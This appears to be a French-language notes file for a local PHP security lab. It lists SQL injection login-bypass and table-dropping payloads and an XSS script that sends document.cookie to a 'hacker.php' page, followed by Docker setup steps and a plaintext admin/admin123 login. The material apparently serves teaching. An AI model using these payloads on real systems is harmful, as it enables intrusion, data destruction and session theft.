sql injection 
un nom d'utilisateur malveillant tel que 
admin' OR '1'='1  et un mot de passe ' OR '1'='1


Si on veut supprimer une table on peut mettre :
 ';Drop table posts ;--
-------------------------
xss
<script>window.location =
'http://localhost/php-security/xss/hacker.php?cookie='+escape(document.cookie)</script>



sql injection 
un nom d'utilisateur malveillant tel que 
admin' OR '1'='1  et un mot de passe ' OR '1'='1.


Si on veut supprimer une table on peut mettre :
 ';Drop table posts ;--
-------------------------
xss
<script>window.location =
'http://localhost:81/xss/hacker.php?cookie='+escape(document.cookie)</script>


------------------------------------------------
#clonner le projet
git clone https://github.com/achrafnh/php-secu.git
cd php-secu

#lancer le projet
docker-compose up -d 

#verivier que les containers snt creer 

docker ps 

#acceder a mysql en CLI 

docker exec -it mysql bash 

# pour se connecter la base le user et le password et sur .env  
mysql -u root -p
show databses;
use dbtest;
show tables;



pour arrete le projet 

docker-compose down

#ou cas ou le projet et deja cloner 
git pull


#htacces htpasswd
admin 
admin123



=============================Docker======================

docker login 

docker build . -t node-application


docker tag node-application hrefnhaila/node-application:1.1.2


docker push  hrefnhaila/node-application:1.1.2

